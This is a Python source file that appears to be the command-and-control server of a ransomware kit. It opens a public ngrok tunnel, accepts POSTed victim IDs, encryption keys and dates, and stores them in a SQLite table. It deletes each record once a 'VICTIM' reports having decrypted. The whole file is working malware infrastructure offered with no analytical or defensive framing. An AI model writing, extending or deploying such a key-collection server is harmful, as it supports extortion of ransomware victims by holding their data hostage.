import ast
from http.server import HTTPServer, BaseHTTPRequestHandler
from pyngrok import ngrok
import sqlite3
from sqlite3 import Error


database = r"database.db"

sql_create_table = """ CREATE TABLE IF NOT EXISTS CLIENT (
                            id integer,
                            key text NOT NULL,
                            date text,
                            decrypted text
                            ); """

def create_connection(db_file):
    conn = None
    try:
        conn = sqlite3.connect(db_file)
        return conn
    except Error as e:
        print(e)

    return conn


def create_table(conn, create_table_sql):
    try:
        c = conn.cursor()
        c.execute(create_table_sql)
    except Error as e:
        print(e)

def insert_data(conn, data):
    sql = ''' INSERT INTO CLIENT(id, key, date, decrypted)
              VALUES(?,?,?,?) '''
    cur = conn.cursor()
    cur.execute(sql, data)
    conn.commit()
    return cur.lastrowid

def delete(conn, id):
    sql = 'DELETE FROM CLIENT WHERE id=?'
    cur = conn.cursor()
    cur.execute(sql, (id,))
    conn.commit()



class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        #self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("hi!"))

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        self._set_headers()
        LIST = ast.literal_eval(post_data.decode('utf-8')) # <-- Convert string to list by removing ''
        print(f"digits: {LIST[0]}")
        print(f"key: {LIST[1]}")
        print(f"date: {LIST[2]}")
        print(f"decrypted: {LIST[3]}")
        digits = LIST[0]
        key = LIST[1]
        date = LIST[2]
        decrypted = LIST[3]

        # create a database connection
        conn = create_connection(database)
        print("CONNECTED TO DATABASE")

        # create tables
        if conn is not None:
        # create CLIENT table
            create_table(conn, sql_create_table)
            print("CREATING DATABASE")

        else:
            print("Error! cannot create the database connection.")

        if decrypted == 'true':
            with conn:
                delete(conn, digits)
                print(f"VICTIM N:{digits} HAVE DECRYPTED THE FILE")
                print(f"DATA FOR {digits} HAVE BEEN DELETED")

        else:          
            with conn:
                INSERT = (int(digits), key, date, decrypted);
                insert_data(conn, INSERT)

            print("DATA HAVE BEEN SAVED")
            print()

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=8000):
    try:
        server_address = (addr, port)
        httpd = server_class(server_address, handler_class)

        url = ngrok.connect(port)
        print(f"Starting httpd server on {url}")
        print()
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.__exit__()
        print("SERVER IS OFFLINE")
        exit()

if __name__ == "__main__":
    run()

